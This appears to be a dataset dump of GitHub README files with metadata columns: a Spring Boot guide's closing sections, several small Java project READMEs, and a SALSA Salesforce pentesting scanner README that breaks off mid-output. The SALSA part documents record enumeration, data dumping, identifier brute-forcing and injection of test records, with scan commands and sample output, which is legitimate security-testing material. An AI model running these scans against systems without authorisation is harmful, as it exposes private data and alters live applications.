- **Purpose**: SonarQube helps improve code quality by automatically detecting issues like bugs, security
  vulnerabilities, and code smells.

- **Best Practices**:
    - **Integrate into CI/CD**: Add SonarQube to your CI/CD pipeline so that your code is checked for quality every time
      you commit or create a pull request.
    - **Set Quality Gates**: Define thresholds for things like code coverage and bugs in SonarQube to ensure your code
      meets quality standards before it’s merged.
    - **Act on Reports**: Regularly review SonarQube reports and fix any issues it finds, focusing on critical problems
      first.
    - **Team Awareness**: Make sure your team understands how to use SonarQube reports to improve their code.
    - **Manage Technical Debt**: Use SonarQube to track and reduce technical debt by identifying areas that need
      refactoring.

---

## 13. Enhanced Pagination Example

Pagination is an essential feature when dealing with large datasets in any application. It helps in breaking down large
amounts of data into manageable chunks, improving both performance and user experience. In this section, I will walk
through an enhanced pagination implementation using Spring Boot that you can adapt for your own projects.

This example will demonstrate how to retrieve paginated and sorted customer data from the database, leveraging custom
search criteria.

### CustomerSearchCriteriaDTO

The `CustomerSearchCriteriaDTO` class is used to encapsulate the search criteria that the client sends to the server.
This DTO not only includes pagination parameters like page and size but also allows for sorting and filtering based on
various fields like firstName, lastName, email, etc.

It’s important to note that all the search fields `firstName`, `lastName`, `email`, `phoneNumber`, and `dateOfBirth` are
optional. You can use them to filter records based on the criteria you need. If no filtering is needed, you can simply
pass the pagination and sorting details.

<details>
  <summary>View CustomerSearchCriteriaDTO code</summary>

```java
package com.ainigma100.customerapi.dto;

import com.ainigma100.customerapi.utils.SortItem;
import io.swagger.v3.oas.annotations.media.Schema;
import jakarta.validation.constraints.*;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.Setter;

import java.time.LocalDate;
import java.util.List;

@Setter
@Getter
@RequiredArgsConstructor
public class CustomerSearchCriteriaDTO {

    private String firstName;
    private String lastName;
    private String email;
    private String phoneNumber;
    private LocalDate dateOfBirth;

    @NotNull(message = ""page cannot be null"")
    @PositiveOrZero(message = ""page must be a zero or a positive number"")
    private Integer page;

    @Schema(example = ""10"")
    @NotNull(message = ""size cannot be null"")
    @Positive(message = ""size must be a positive number"")
    private Integer size;

    private List<SortItem> sortList;

}
```

</details>



For example, you can send a request like this:

```json
{
  ""page"": 0,
  ""size"": 10,
  ""sortList"": [
    {
      ""field"": ""id"",
      ""direction"": ""ASC""
    }
  ]
}
```

Assuming you have this record in your database:

```json
{
  ""id"": 2,
  ""firstName"": ""marco"",
  ""lastName"": ""polo"",
  ""email"": ""mpolo@gmail.com"",
  ""phoneNumber"": ""1234567891"",
  ""dateOfBirth"": ""2004-08-13""
}
```

If you need to filter only by firstName, you can send a request like this:

```json
{
  ""firstName"": ""marco"",
  ""page"": 0,
  ""size"": 10,
  ""sortList"": [
    {
      ""field"": ""id"",
      ""direction"": ""ASC""
    }
  ]
}
```

**Note**: You can experiment with different combinations of filters and pagination parameters based on your needs.

### Repository Query for Pagination and Filtering

The following query is responsible for handling pagination and filtering.

```java

@Query(value = """"""
        select cus from Customer cus
        where ( :#{#criteria.firstName} IS NULL OR LOWER(cus.firstName) LIKE LOWER( CONCAT(:#{#criteria.firstName}, '%') ) )
        and ( :#{#criteria.lastName} IS NULL OR LOWER(cus.lastName) LIKE LOWER( CONCAT(:#{#criteria.lastName}, '%') ) )
        and ( :#{#criteria.email} IS NULL OR LOWER(cus.email) LIKE LOWER( CONCAT('%', :#{#criteria.email}, '%') ) )
        and ( :#{#criteria.phoneNumber} IS NULL OR LOWER(cus.phoneNumber) LIKE LOWER( CONCAT('%', :#{#criteria.phoneNumber}, '%') ) )
        and ( :#{#criteria.dateOfBirth} IS NULL OR cus.dateOfBirth = :#{#criteria.dateOfBirth} )
        """""")
Page<Customer> getAllCustomersUsingPagination(
        @Param(""criteria"") CustomerSearchCriteriaDTO customerSearchCriteriaDTO,
        Pageable pageable);
```

### Query Analysis

The query allows you to filter customer data based on the criteria you provide. Here’s how it works:

- **Flexible Filters**: Each field, like `firstName` or `email`, can be used to filter results. If you don’t need a
  specific filter, you can leave it out, and the query will ignore that field.
- **Examples**:
    - **Filtering by First Name**: If you provide a `firstName`, the query looks for customers whose names start with
      that value.
    - **Flexible Email Search**: The query can find customers even if you provide only part of their email address.

This approach makes the query easy to use and flexible for different search needs.

### Utils Class

To facilitate pagination and sorting, a utility class is often needed. Below is an example of a utility class that helps
in creating pageable objects based on the SortItem list provided in the DTO.

<details>
  <summary>View Utils code</summary>

```java
package com.ainigma100.customerapi.utils;

import lombok.extern.slf4j.Slf4j;
import org.springframework.data.domain.PageRequest;
import org.springframework.data.domain.Pageable;
import org.springframework.data.domain.Sort;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.function.Supplier;

@Slf4j
public class Utils {

    // Private constructor to prevent instantiation
    private Utils() {
        throw new IllegalStateException(""Utility class"");
    }


    /**
     * Retrieves a value from a Supplier or sets a default value if a NullPointerException occurs.
     * Usage example:
     *
     * <pre>{@code
     * // Example 1: Retrieve a list or provide an empty list if null
     * List<Employee> employeeList = Utils.retrieveValueOrSetDefault(() -> someSupplierMethod(), new ArrayList<>());
     *
     * // Example 2: Retrieve an Employee object or provide a default object if null
     * Employee emp = Utils.retrieveValueOrSetDefault(() -> anotherSupplierMethod(), new Employee());
     * }</pre>
     *
     * @param supplier     the Supplier providing the value to retrieve
     * @param defaultValue the default value to return if a NullPointerException occurs
     * @return the retrieved value or the default value if a NullPointerException occurs
     * @param <T>          the type of the value
     */
    public static <T> T retrieveValueOrSetDefault(Supplier<T> supplier, T defaultValue) {

        try {
            return supplier.get();

        } catch (NullPointerException ex) {

            log.error(""Error while retrieveValueOrSetDefault {}"", ex.getMessage());

            return defaultValue;
        }
    }


    public static Pageable createPageableBasedOnPageAndSizeAndSorting(List<SortItem> sortList, Integer page, Integer size) {

        List<Sort.Order> orders = new ArrayList<>();

        if (sortList != null) {
            // iterate the SortList to see based on which attributes we are going to Order By the results.
            for (SortItem sortValue : sortList) {
                orders.add(new Sort.Order(sortValue.getDirection(), sortValue.getField()));
            }
        }


        return PageRequest.of(
                Optional.ofNullable(page).orElse(0),
                Optional.ofNullable(size).orElse(10),
                Sort.by(orders));
    }

}
```

</details>

### SortItem

The SortItem class encapsulates the sorting criteria, including the field to be sorted and the direction (ascending or
descending).

<details>
  <summary>View SortItem code</summary>

```java
package com.ainigma100.customerapi.utils;

import io.swagger.v3.oas.annotations.media.Schema;
import lombok.Getter;
import org.springframework.data.domain.Sort;

import java.io.Serializable;

@Getter
public class SortItem implements Serializable {


    @Schema(example = ""id"") // set a default sorting property for swagger
    private String field;
    private Sort.Direction direction;

}
```

</details>


**Note**: You can check the implementation and the testing of this feature by reading the code.

By implementing enhanced pagination, you ensure that your application can efficiently handle large datasets while
providing users with a responsive experience. This approach is versatile and can be adapted to various other scenarios
in your application.

---

## 14. Appendix: Using `openapi-generator-maven-plugin` for API Client Generation

**The configuration in this section is not part of the current project but is provided to share it with the community
for educational purposes. You will not find it in the codebase, but you may find it useful if you need to generate 
client code for an external API.**

### Overview

In many cases, when working with external APIs, the provider may supply an OpenAPI (Swagger) specification. Instead of
manually creating models and client code, you can use the `openapi-generator-maven-plugin` to automate this process.
This saves development time and ensures the API client and models are always in sync with the specification.

### Why Use This Plugin?

The `openapi-generator-maven-plugin` is particularly useful in scenarios such as:

- **Integrating with Third-Party APIs**: You can generate client code automatically based on external API
  specifications (Swagger).
- **Maintaining Consistency**: When APIs change frequently, auto-generating code ensures that your models and API
  clients remain consistent with the latest API definitions.
- **Avoiding Manual Model Creation**: Instead of creating Java models for responses manually, you can generate them
  directly from the Swagger spec.
- **Time-Saving**: Automating the process of generating client code from API definitions saves time and effort when
  integrating with complex or frequently changing APIs.

### Benefits of Using OpenAPI Generator

1. **Auto-Generated API Clients**: Automatically generate Java client code to call external APIs, avoiding the need to
   manually code the clients.
2. **Consistent Models**: Ensure consistency between the API models and the actual API by generating them from the spec.
3. **Faster Development**: Automates the client code generation process, allowing you to quickly integrate with
   third-party APIs.
4. **Swagger Files for External API Calls**: When provided with a Swagger spec for an external API, you can generate the
   client code and models instead of writing them by hand.

**Note**: Most of the time I use it to check the APIs and to avoid implementing the Java objects they return.

### How to Use `openapi-generator-maven-plugin`

Although this is not part of the current project, here's an example of how you could configure the plugin to generate
client code for external APIs:

### Step 1: Add the Swagger Files

Create a folder named swagger inside src/main/resources and place your OpenAPI specification files (in JSON or YAML
format) inside.

```
├── src/
│   ├── main/
│   │   ├── java/
│   │   └── resources/
│   │       └── swagger/
│   │           ├── department-api.json
```

### Step 2: Configure `pom.xml`

Before adding new dependencies, check if you already have similar dependencies to avoid conflicts. Add the necessary
properties and dependencies:

```xml

<properties>
    <!-- other properties -->

    <!-- Add the latest versions -->
    <springdoc-openapi-starter-webmvc-ui.version>2.6.0</springdoc-openapi-starter-webmvc-ui.version>
    <openapi-generator-maven-plugin.version>7.8.0</openapi-generator-maven-plugin.version>
    <jackson-databind-nullable.version>0.2.6</jackson-databind-nullable.version>
</properties>
```

Add the required dependencies:

```xml

<dependency>
    <groupId>org.springdoc</groupId>
    <artifactId>springdoc-openapi-starter-webmvc-ui</artifactId>
    <version>${springdoc-openapi-starter-webmvc-ui.version}</version>
</dependency>

<dependency>
<groupId>org.openapitools</groupId>
<artifactId>jackson-databind-nullable</artifactId>
<version>${jackson-databind-nullable.version}</version>
</dependency>
```

### Step 3: Add the OpenAPI Generator Plugin

```xml

<plugin>
    <groupId>org.openapitools</groupId>
    <artifactId>openapi-generator-maven-plugin</artifactId>
    <version>${openapi-generator-maven-plugin.version}</version>
    <executions>
        <!-- Generate Department API client code -->
        <execution>
            <id>department-api</id>
            <goals>
                <goal>generate</goal>
            </goals>
            <configuration>
                <inputSpec>${project.basedir}/src/main/resources/swagger/department-api.json</inputSpec>
                <generatorName>spring</generatorName>
                <output>${project.build.directory}/gen-openapi/department</output>
                <apiPackage>${project.groupId}.department.api</apiPackage>
                <modelPackage>${project.groupId}.department.model</modelPackage>
                <generateSupportingFiles>true</generateSupportingFiles>
                <configOptions>
                    <delegatePattern>true</delegatePattern>
                    <interfaceOnly>true</interfaceOnly>
                    <useSpringBoot3>true</useSpringBoot3>
                    <cleanupOutput>true</cleanupOutput>
                </configOptions>
            </configuration>
        </execution>

        <!-- You can add more files here as a new execution. Just be sure to have different 'id' -->

    </executions>
</plugin>
```

### Step 4: Run Maven Command

Run the following Maven command to generate the code based on the OpenAPI specifications.

```shell
mvn clean install
```

As soon as you run the above command, you will notice that some generated files have been
created in the target folder. You will find inside there the ```APIs``` and the ```Models```.

```
├── target/
│   └── gen-openapi/
│       ├── department/
```

### Step 5: Generate Sources and Update Folders (if necessary)

If after running `mvn clean install` you find that the generated models are not imported into your project, you may need
to manually update the project sources. Follow these steps:

1. Right-click on your project in your IntelliJ.
2. Navigate to `Maven` → `Generate Sources and Update Folders`.

This action triggers Maven to re-import the generated sources into your project. After completion, verify that the
generated models are now accessible within your project structure.

### Additional Configurations

The `openapi-generator-maven-plugin` offers a variety of configurations to customize the generated code, such as
generating different types of API clients, models, or server stubs. You can explore more configurations and options in
the official plugin documentation
found https://github.com/OpenAPITools/openapi-generator/tree/master/modules/openapi-generator-maven-plugin.

### Summary

Using tools like `openapi-generator-maven-plugin` can save time and effort when working with external APIs. It automates
the creation of client code and models, ensuring that they are always consistent with the API spec, without manual
intervention. Although not included in this guide's codebase, this is a useful technique for certain scenarios where you
frequently call external services based on OpenAPI specifications.

---

## 15. Feedback and Contributions

Feedback and contributions are welcome! If you have suggestions, improvements, or additional insights, please feel free
to share. Together, we can make this a valuable resource for anyone learning Spring Boot 3.

",0,0,1,1.0,"['spring', 'boot', 'knowledge', 'share', 'table', 'content', 'introduction', 'what', 'spring', 'boot', 'why', 'use', 'spring', 'boot', 'project', 'structure', 'overview', 'package', 'their', 'purpose', 'introduction', 'maven', 'what', 'maven', 'what', 'pom', 'key', 'concept', 'pom', 'project', 'coordinate', 'dependency', 'plugins', 'example', 'file', 'customer', 'api', 'dependency', 'include', 'add', 'more', 'dependency', 'explanation', 'plugin', 'configuration', 'key', 'annotation', 'spring', 'boot', 'spring', 'boot', 'annotation', 'dependency', 'injection', 'component', 'scan', 'entity', 'class', 'annotation', 'controller', 'class', 'annotation', 'configuration', 'bean', 'management', 'event', 'handle', 'lombok', 'annotation', 'additional', 'note', 'dependency', 'injection', 'spring', 'boot', 'why', 'use', 'dependency', 'injection', 'constructor', 'injection', 'use', 'lombok', 'simplify', 'constructor', 'injection', 'the', 'autowired', 'annotation', 'without', 'use', 'lombok', 'annotation', 'why', 'constructor', 'injection', 'better', 'design', 'pattern', 'restful', 'api', 'mvc', 'restful', 'api', 'architecture', 'mvc', 'difference', 'between', 'restful', 'api', 'mvc', 'choose', 'right', 'pattern', 'name', 'convention', 'package', 'name', 'class', 'naming', 'entity', 'name', 'api', 'endpoint', 'naming', 'configure', 'why', 'general', 'configuration', 'configuration', 'activate', 'profile', 'best', 'practice', 'example', 'file', 'customer', 'api', 'specify', 'active', 'profile', 'note', 'detail', 'package', 'breakdown', 'entity', 'layer', 'why', 'not', 'use', 'data', 'importance', 'equal', 'hashcode', 'additional', 'column', 'specification', 'repository', 'layer', 'query', 'method', 'overview', 'derive', 'query', 'method', 'custom', 'query', 'query', 'native', 'query', 'when', 'use', 'native', 'query', 'dtos', 'mapstruct', 'key', 'concept', 'service', 'layer', 'key', 'concept', 'controller', 'layer', 'key', 'concept', 'http', 'method', 'annotation', 'exception', 'handle', 'global', 'exception', 'handler', 'custom', 'exception', 'structured', 'error', 'response', 'helper', 'class', 'openapiconfig', 'loggingfilter', 'filtersconfig', 'serverdetails', 'test', 'unit', 'test', 'behavior', 'driven', 'development', 'bdd', 'test', 'intellij', 'live', 'template', 'bdd', 'test', 'repository', 'layer', 'test', 'service', 'layer', 'test', 'controller', 'layer', 'key', 'point', 'note', 'integration', 'test', 'use', 'docker', 'testcontainers', 'note', 'best', 'practice', 'use', 'dtos', 'abstract', 'entity', 'data', 'leverage', 'spring', 's', 'dependency', 'injection', 'handle', 'exception', 'globally', 'organize', 'your', 'code', 'name', 'convention', 'use', 'wrapper', 'object', 'api', 'response', 'break', 'down', 'complex', 'logic', 'document', 'your', 'code', 'version', 'control', 'database', 'migration', 'liquibase', 'flyway', 'static', 'code', 'analysis', 'sonarqube', 'enhance', 'pagination', 'example', 'customersearchcriteriadto', 'repository', 'query', 'pagination', 'filtering', 'query', 'analysis', 'utils', 'class', 'sortitem', 'appendix', 'using', 'api', 'client', 'generation', 'overview', 'why', 'use', 'this', 'plugin', 'benefit', 'use', 'openapi', 'generator', 'how', 'use', 'step', 'add', 'swagger', 'file', 'step', 'configure', 'step', 'add', 'openapi', 'generator', 'plugin', 'step', 'run', 'maven', 'command', 'step', 'generate', 'source', 'update', 'folder', 'if', 'necessary', 'additional', 'configuration', 'summary', 'feedback', 'contribution']","['use', 'api', 'annotation', 'query', 'spring']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
aliFetvaci61/credit-finance-application,master,"# Credit Finance Application

This project is a credit application. Users can register and log in to the application and take out credits and pay the installments of these credits.

## General Features

- Users can register
- Users can log in.
- Users take out credits
- Users can view the credits they have taken out
- Users can view the installments of credits
- Users can pay the installments of credits

## Technologies Used
- Java 17: A modern, performant, and up-to-date language used in the application.
- Spring Boot: A framework for building Spring-based applications quickly and easily.
- Docker: A containerization platform for quick deployment and running of the application.
- Kafka: A distributed messaging system used for event processing and data streaming.
- Elasticsearch: An open-source search engine used for high-performance search, analytics, and data storage.
- MySQL: A relational database management system used for data storage and management.
- PostgreSQL: A relational database management system used for data storage and management.
- Redis: An in-memory, NoSQL key/value store database management system

## Design Patterns Used
- API Gateway pattern
  - Routing
  - Transformation
  - Security
- Command Query Responsibility Segregation pattern
- Database per service pattern
- Event-Driven Architecture Pattern
- Decomposition pattern
- Security - Sensitive Data Encapsulation

# Software Architecture Design for Credit Finance Application

![image](https://github.com/user-attachments/assets/a56d549f-69b0-45ad-b9ed-974358181938)

## Installation
- make build: Builds the Docker image for the application.
- make up: Starts the application in detached mode.
- make down: Stops and removes the containers created by the application.
- make health: Builds the health-check Docker image.


## Contributing

- Fork the project.
- Create a new branch: git checkout -b new-feature
- Make your changes and commit them: git commit -am 'Add new feature'
- Push to the branch: git push origin new-feature
- Create a new Pull Request.


",0,1,1,0.0,"['credit', 'finance', 'application', 'general', 'feature', 'technology', 'use', 'design', 'pattern', 'use', 'software', 'architecture', 'design', 'credit', 'finance', 'application', 'installation', 'contribute']","['credit', 'finance', 'application', 'use', 'design']",5.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,5.0,0.0
BulPlugins/BulMultiverse,main,"<p align=""center"">
    <img src=""https://i.goopics.net/77bvma.png"" width=""256"">
</p>

BulMultiverse is an ultra-optimized lightweight world management plugin. Compatible with version 1.8 to the Latest Minecrat version. Unlike the default Multiverse-Core plugin, BulMultiverse is designed to be lean and efficient, without any unnecessary listeners.. This plugin don't contain and will never contain any listeners for any reason.
[Download page](https://www.spigotmc.org/resources/118884/ ""Click to download"")

<img src=""https://img.shields.io/badge/Table_of_contents-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

1. [Features](#features)
1. [Configuration file](#configuration-file)
2. [Commands and permissions](#commands-and-permissions)
3. [Flags](#flags)
4. [How to delete a world](#how-to-delete-a-world)
5. [Addons](#addons)
6. [Distribution](#distribution)

<img id=""features"" src=""https://img.shields.io/badge/Features-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

- Create world with customizable settings (e.g seed, difficulty, etc).
- Modify Existing World Settings (e.g, difficulty, PvP, etc).
- Teleport between world.
- Load existing world.
- List loaded worlds.
- Disable invalid world names (e.g, ""plugins"").

<img id=""configuration-file"" src=""https://img.shields.io/badge/Configuration_file-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

```
//Disable invalid world names
world_disable_name: [plugins, bStats, PluginMetrics]

messages:
  no_world_target: ""&e[BULMultiverse] &cYou didn't target any world or world name. &e/bmv help""
  world_not_found: ""&e[BULMultiverse] &cThe world &e%name% is not found. &e/bmv list""
  flag_not_found: ""&e[BULMultiverse] &cThe flag %name% don't exist. &e/bmv flags""
  forbidden_world_name: ""&e[BULMultiverse] &cYou can't create a world with this name, check your config.yml.""
  cmd_load_success: ""&e[BULMultiverse] &aworld: &2%name% &aloaded.""
  cmd_teleport_success: ""&e[BULMultiverse] &aYou are teleported to the world: &2%name%.""
  cmd_unload_success: ""&e[BULMultiverse] &aThe world: &2%name% is unload.""
  error_set_option: ""&e[BULMultiverse] &cImpossible to set this option.""
  error_world_creator: ""&e[BULMultiverse] &cThis option does not support WorldCreator.""
  help_pattern: ""&e%usage% &8| &e%description%""
  flags_pattern: ""&e%usage% &8| &e%description%""
  only_ingame_command: ""&e[BULMultiverse] &cThis command can be executed only in-game.""
  no_permission: ""&e[BULMultiverse] &cYou don't have the permission to do that""
```

<img id=""commands-and-permissions"" src=""https://img.shields.io/badge/Commands_and_permissions-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

| Command                         | Description                                                       | Permission          |
|---------------------------------|-------------------------------------------------------------------|---------------------|
| bmv create [World Name] (Flags) | Create a world with the given name and optionals flags            | bulmultiverse.admin |
| bmv load [World Name]           | Load the target existing world                                    | bulmultiverse.admin |
| bmv unload [World Name]         | UnLoad the target existing world (This doesn't remove the folder) | bulmultiverse.admin |
| bmv set [World Name] [Flag]     | Set the flag for the target world                                 | bulmultiverse.admin |
| bmv tp [World Name]             | Teleport to the target world                                      | bulmultiverse.admin |
| bmv list                        | List all the worlds managed by BulMultiverse                      | bulmultiverse.admin |
| bmv infos (World Name)          | Display actual settings for the world                             | bulmultiverse.admin |
| bmv help                        | Display the in-game help                                          | bulmultiverse.admin |
| bmv flags                       | Display all the availables flag                                   | bulmultiverse.admin |

<img id=""flags"" src=""https://img.shields.io/badge/Flags-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

| Command            | Description                                           | example                             |
|--------------------|-------------------------------------------------------|-------------------------------------|
| -s [Number]        | Create a world with the given seed                    | /bmv create exemple -s 15648648949  |
| -b [true or false] | Enable the default builds in the world (e.g, village) | /bmv create exemple -b false        |
| -e [Environment]   | Set the environment (e.g, nether)                     | /bmv create exemple -e the_end      |
| -p [true or false] | Enable the pvp                                        | /bmv create exemple -p false        |
| -t [Type]          | Set type (e.g, flat, amplified)                       | /bmv create exemple -t large_biomes |
| -d [Difficulty]    | Set difficulty (e.g, easy, hard)                      | /bmv create exemple -d peaceful     |

You can chain flags together, for example:
`/bmv create exemple -d peaceful -p false -t flat`

Missed a flag during creation? You can set it later using the set command:
`/bmv set exemple -d peaceful`
> NOTE
> Some flags like the seed, cannot be changed after the world is created. If you make an error in the command, such as setting an invalid difficulty:
'/bmv create exemple -d SUPERHARDCORP'
the default difficulty will be used instead. Be sure to check the console for errors when creating worlds.

<img id=""how-to-delete-a-world"" src=""https://img.shields.io/badge/How_to_delete_a_world-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

BulMultiverse does not delete server files or folders directly. To remove a world:
1. Stop your server.
2. Manually delete the world's folder.
3. Restart your server.

BulMultiverse will detect that the world folder is missing and automatically remove it from its worlds.yml file.

<img id=""addons"" src=""https://img.shields.io/badge/Addons-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

> /!\ DO NOT RENAME THE ADDONS JAR FILE, OR THE PLUGIN WILL NOT DETECT THEM

So the default BulMultiverse.jar is very light and optimized, but what if you want an additional specific feature ?

To address this, I've created a robust addons system. This means you can add a specific .jar file (for example, PerWorldInventory.jar)
to the 'addons' folder within the BulMultiverse directory, and you'll have a new feature: PerWorldInventory!

#### VoidWorld

This addon allow you to create a totally empty world. [Download page](https://www.spigotmc.org/resources/119020/ ""Click to download"")

| Type    | value     | Description                     | example                     |
|---------|-----------|---------------------------------|-----------------------------|
| flag    | -c void   | Create a empty world (void)     | /bmv create exemple -c void |
| command | /setblock | Create a block at your position | /setblock                   |

#### PerWorldInventory

WORK IN PROGRESS. To be notified join the discord https://discord.gg/wxnTV68dX2

#### GuiWorldManager

WORK IN PROGRESS. To be notified join the discord https://discord.gg/wxnTV68dX2

#### LinkPortal

This addon allow you to link nether or end portal to specific world.. [Download page](https://www.spigotmc.org/resources/119396/ ""Click to download"")

<img id=""distribution"" src=""https://img.shields.io/badge/Distribution-50C878?style=for-the-badge"" alt=""Configuration file"" style=""pointer-events: none;"">

This is a public plugin. You are free to use it and create a fork to develop your own version. However you are not allowed to sell or distribute it in a private manner.",0,3,1,2.0,"['voidworld', 'perworldinventory', 'guiworldmanager', 'linkportal']","['voidworld', 'perworldinventory', 'guiworldmanager', 'linkportal']",1.0,[org.apache.maven.plugins:maven-shade-plugin],0.0,1.0,0.0
davidtos/LIO,master,"# LIO (Linux IO)
This repository is part of my talk about Project Panama. I aim to show how you can call C libraries from inside your Java code.

## What is inside this repository
The library contains a working example of FUSE and IO_URING with liburing. 

- **FUSE** code see [this](https://github.com/davidtos/LIO/blob/master/src/main/java/com/davidvlijmincx/FuseMain.java)
  - To unmount use the following command `fusermount3 -u $FILE_PATH`
- **IO_URING READ** code see [this](https://github.com/davidtos/LIO/blob/master/src/main/java/com/davidvlijmincx/IoUringReadExample.java)
  - The read example uses polling to reduce the number of system calls.
  - To see that the polling is working you can use `sudo bpftrace -e 'tracepoint:io_uring:io_uring_submit_req* {printf(""%s(%d)\n"", comm, pid);}'` this shows you what called submit.
- **IO_URING WRITE** code see [this](https://github.com/davidtos/LIO/blob/master/src/main/java/com/davidvlijmincx/IoUringWriteExample.java)
  - The write example does not use polling but makes a system call.

## Wrapper code
The code that calls the C code is generated using [Jextract](https://github.com/openjdk/jextract). Jextract creates Java code based on the header files.

To generate FUSE:
`jextract -D_FILE_OFFSET_BITS=64 -D FUSE_USE_VERSION=35 --source -d generated/src -t org.libfuse -I /Documents/libfuse-fuse-3.10.5/include/ /Documents/libfuse-fuse-3.10.5/include/fuse.h`

To generate Liburing:
`jextract -D IOURINGINLINE=extern  -l uring -t io.uring -I include --output ./generated --header-class-name liburingtest include/liburing.h`

## Side note
This sample code is not production ready, it's just a proof of concept that happens to work.
",0,0,3,0.0,"['lio', 'linux', 'io', 'what', 'inside', 'repository', 'wrapper', 'code', 'side', 'note']","['lio', 'linux', 'io', 'what', 'inside']",1.0,[],0.0,1.0,0.0
kousiknath/Concurrency,main,"## Concurrency and Multi-threading for everyone 

1. Recipe for alternate data printing (synchronization, wait-notify, volatile)
2. Recipe for rate limiting (Semaphore)
3. Recipe for counting words in a big file (Countdown Latch)
4. Recipe for Friends Outing (Cyclic Barrier)
5. Recipe for bank transaction (ReentrantLock)
6. Recipe for in-memory logging (ReadWriteLock)
7. Recipe for producer-consumer model (Lock.Condition, wait-notify)
",0,0,1,0.0,"['concurrency', 'everyone']","['concurrency', 'everyone']",1.0,[],0.0,1.0,0.0
cosad3s/salsa,main,"# SALSA - *SALesforce Scanner for Aura (and beyond)*

<p align=""center"">
<img src=""./assets/logo.jpeg"" width=""150"">

**SALSA** has been developped on a lot of my personal free time, to help me on pentesting and bug hunting activites against Salesforce Lightning (Aura) and API assets. Please note it is fully experimental.

I decided to share it for free, to help the community.  
*If you would ever like to buy me a coffee or a beer* 😇 :

[![""Buy Me A Coffee""](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/cosades)  

</p>

## Features

- Enumeration and/or dump data records (*and sub-records*) from:
  - Aura controllers
  - Services API (Direct sObjects `/services/data/v60.0/sobjects` or SOQL `/services/data/v60.0/query/`)
  - SOAP (`/services/Soap/c/`)
- Works as unauthenticated or authenticated user (*username / password or `sid` or `aura.token`*).
- Enumeration records entities types (with or without custom entities `*__c` filtering) from:  
  - Target APIs harvesting
  - And/or Salesforce packages reflections
  - And/or encountered entities in the wild
- Test for targetted record identifier.
- Bruteforcing record identifiers.
- ⚠️ Automatized test for arbitrary records creation.
- ⚠️ Automatized test for arbitrary records fields edition.
- *And more: routing to HTTP proxy for investigation, custom User-Agent, automatized finding of entities fields, auto-detect FWUID, etc.*

⚠️: *dangerous & experimental*

## Usage

### Help

```bash
usage: SALSA 💃⚡ - SALesforce Scanner for Aura (and beyond)
       [-h] -t TARGET [-u USERNAME] [-p PASSWORD] [--sid SID] [--token TOKEN] [--path PATH] [--id ID] [--bruteforce] [--types TYPES] [--update] [--create] [--ua UA] [--proxy PROXY] [--dump]
       [--output OUTPUT] [--typesintrospection] [--typeswordlist] [--typesapi] [--custom] [--app APP] [--force] [--debug] [--trace]

Enumeration of vulnerabilities and misconfiguration against Salesforce endpoint.

named arguments:
  -h, --help             show this help message and exit
  -t TARGET, --target TARGET
                         Target URL
  -u USERNAME, --username USERNAME
                         Username (for authenticated mode)
  -p PASSWORD, --password PASSWORD
                         Password (for authenticated mode)
  --sid SID              The SID cookie value (for authenticated mode - instead of username/password)
  --token TOKEN          The aura token (for authenticated mode - instead of username/password)
  --path PATH            Set specific base path.
  --id ID                Find a specific record from its id.
  --bruteforce           Enable bruteforce of Salesforce identifiers from a specific record id (from --recordid). (default: false)
  --types TYPES          Target record(s) only from following type(s) (should be comma-separated).
  --update               Test for record fields update permissions (WARNING: will inject data in the app!). (default: false)
  --create               Test for record creation permissions (WARNING: will inject data in the app!). (default: false)
  --ua UA                Set specific User-Agent.
  --proxy PROXY          Use following HTTP proxy (ex: 127.0.0.1:8080).
  --dump                 Dump records as Json files. (default: false)
  --output OUTPUT        Output folder for dumping records as Json files.
  --typesintrospection   Use record types from Salesforce package introspection. (default: false)
  --typeswordlist        Use record types from internal wordlist. (default: false)
  --typesapi             Use record types from APIs on the target. (default: false)
  --custom               Only target custom record types (*__c). (default: false)
  --app APP              Custom AURA App Name.
  --force                Continue the scanning actions even if in case of incoherent or incorrect results. (default: false)
  --debug                Increase the log level to DEBUG mode. (default: false)
  --trace                Increase the log level to TRACE mode. (default: false)
```

### Examples

<details>
    <summary>Simple scan - Unauthenticated</summary>

```bash
java -jar target/salsa-jar-with-dependencies.jar -t https://www.target.com --typesapi

[*] Searching for Salesforce Aura instance on https://www.target.com ...
[!] Found Salesforce Aura instance on path: /aura
[!] Scan will continue as unauthenticated (guest) user ...
[*] Looking for all objects with standard or custom types.
[*] Will retrieve all sObjects types known by the target from Aura service.
[*] Found 2111 object types from Salesforce Aura service!
[*] Will retrieve all sObjects types known by the target from REST sObject API.
[*] Aura: looking for records for type AINaturalLangProcessRslt
[*] Aura: looking for records for type AINtrlLangProcChunkRslt
[*] Aura: looking for records for type AIPredictionScore
(...)
```

</details>

<details>
    <summary>Simple scan - Unauthenticated - Custom types only</summary>

```bash
❯ java -jar target/salsa-jar-with-dependencies.jar -t https://www.target.com --typesapi --custom

[*] Searching for Salesforce Aura instance on https://www.target.com ...
[!] Found Salesforce Aura instance on path: /aura
[!] Scan will continue as unauthenticated (guest) user ...
[*] Looking for all objects with standard or custom types.
[*] Will retrieve all sObjects types known by the target from Aura service.
[*] Found 2111 object types from Salesforce Aura service!
[*] Will retrieve all sObjects types known by the target from REST sObject API.
[*] Reducing to 4 custom object types.
[*] Aura: looking for records for type CountryLanguage__c
[*] Looking for sObject with recordId 00B0H000007t1qlUAA and type(s) [ListView].
[!] The recordId 00B0H000007t1qlUAA cannot be found through descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord (error: We couldn't find the record you're trying to access. It may have been deleted by another user, or there may have been a system error. Ask your administrator for help.).
